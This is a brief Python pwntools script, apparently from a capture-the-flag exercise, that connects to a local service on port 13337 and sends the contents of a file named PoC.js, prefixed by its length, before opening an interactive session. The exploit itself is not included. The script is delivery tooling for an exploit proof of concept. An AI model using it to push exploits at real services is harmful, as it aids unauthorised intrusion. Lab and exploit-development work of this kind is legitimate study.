#!/usr/bin/python3
from pwn import *

URL = "localhost"

io = remote(URL, 13337)

sploit = open("./PoC.js", "r")

sploit = sploit.read()

io.sendlineafter(b">>", str(len(sploit)).encode())

io.sendlineafter(b">>", sploit)

io.interactive()
